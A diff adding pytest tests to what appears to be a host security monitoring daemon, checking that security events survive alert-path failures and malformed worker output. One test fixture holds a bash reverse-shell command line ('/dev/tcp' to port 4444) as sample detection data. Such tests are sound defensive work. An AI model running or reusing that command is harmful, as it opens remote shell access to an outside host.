@@ -2,9 +2,16 @@
 
 from __future__ import annotations
 
+import io
+import logging
+import threading
 import time
 from datetime import UTC, datetime
 from pathlib import Path
+from types import SimpleNamespace
+from typing import Any
+
+import pytest
 
 from inspectord.config import dev_config
 from inspectord.parsers.base import build_event
@@ -223,5 +230,117 @@ def test_supervisor_persist_projects_process_state(tmp_path: Path) -> None:
                 break
             time.sleep(0.05)
         assert rows == [("running",)]
+    finally:
+        sup.stop(timeout=5.0)
+
+
+# --------------------------------------------------------------------------
+# _dispatch: the one path every event takes (worker readers + monitor)
+# --------------------------------------------------------------------------
+
+
+def _reverse_shell_event() -> Event:
+    """An event the starter pack alerts on, so the alert path actually runs."""
+    return build_event(
+        module="process_collector",
+        action="process_start",
+        category=["process"],
+        type_=["start"],
+        severity="info",
+        process={
+            "pid": 9999,
+            "name": "bash",
+            "command_line": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
+        },
+    )
+
+
+def _fake_worker(lines: list[bytes]) -> Any:
+    """A stand-in _WorkerProc whose stdout is a canned byte stream."""
+    return SimpleNamespace(
+        spec=SimpleNamespace(name="fake"),
+        proc=SimpleNamespace(stdout=io.BytesIO(b"".join(line + b"\n" for line in lines))),
+    )
+
+
+def test_event_is_published_even_when_the_alert_path_raises(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
+) -> None:
+    """A failing rule/alert path must never swallow the event itself.
+
+    alerts.dedup does a SELECT-then-UPDATE that can raise on a concurrent
+    conflict; if that killed the publish, a security event would be lost
+    entirely -- unstored, unprojected, invisible.
+    """
+    cfg = dev_config(base=tmp_path)
+    cfg.workers = []  # no subprocesses; we inject directly
+    sup = Supervisor(cfg)
+    sup.start()
+    try:
+
+        def boom(_ev: Event) -> list[object]:
+            raise RuntimeError("conflict on update!")
+
+        monkeypatch.setattr(sup._rule_engine, "process", boom)
+        seen: list[Event] = []
+        sup.attach_listener(seen.append)
+
+        ev = _reverse_shell_event()
+        with caplog.at_level(logging.ERROR):
+            sup._inject_for_test(ev)
+
+        deadline = time.monotonic() + 3.0
+        while time.monotonic() < deadline and not any(e.event_id == ev.event_id for e in seen):
+            time.sleep(0.01)
+        assert any(e.event_id == ev.event_id for e in seen), (
+            "the event was dropped because the alert path raised"
+        )
+        assert "alert path failed" in caplog.text
+    finally:
+        sup.stop(timeout=5.0)
+
+
+def test_worker_events_fan_out_alerts_on_the_reader_thread(tmp_path: Path) -> None:
+    """Alert fan-out must stay on the thread that read the worker's line."""
+    cfg = dev_config(base=tmp_path)
+    cfg.workers = []
+    sup = Supervisor(cfg)
+    sup.start()
+    try:
+        threads: list[threading.Thread] = []
+        sup.attach_alert_listener(lambda _a: threads.append(threading.current_thread()))
+
+        ev = _reverse_shell_event()
+        sup._read_stdout(_fake_worker([ev.model_dump_json().encode("utf-8")]))
+
+        assert threads, "no alert fanned out for a worker-emitted event"
+        assert all(t is threading.current_thread() for t in threads), (
+            "alert fan-out moved off the reader thread"
+        )
+    finally:
+        sup.stop(timeout=5.0)
+
+
+def test_reader_survives_a_malformed_line_and_reports_it_accurately(
+    tmp_path: Path, caplog: pytest.LogCaptureFixture
+) -> None:
+    cfg = dev_config(base=tmp_path)
+    cfg.workers = []
+    sup = Supervisor(cfg)
+    sup.start()
+    try:
+        seen: list[Event] = []
+        sup.attach_listener(seen.append)
+        ev = _reverse_shell_event()
+        with caplog.at_level(logging.ERROR):
+            sup._read_stdout(_fake_worker([b"{not json", ev.model_dump_json().encode("utf-8")]))
+        assert "emitted invalid event" in caplog.text
+
+        deadline = time.monotonic() + 3.0
+        while time.monotonic() < deadline and not any(e.event_id == ev.event_id for e in seen):
+            time.sleep(0.01)
+        assert any(e.event_id == ev.event_id for e in seen), (
+            "a malformed line stopped the reader from dispatching the next one"
+        )
     finally:
         sup.stop(timeout=5.0)
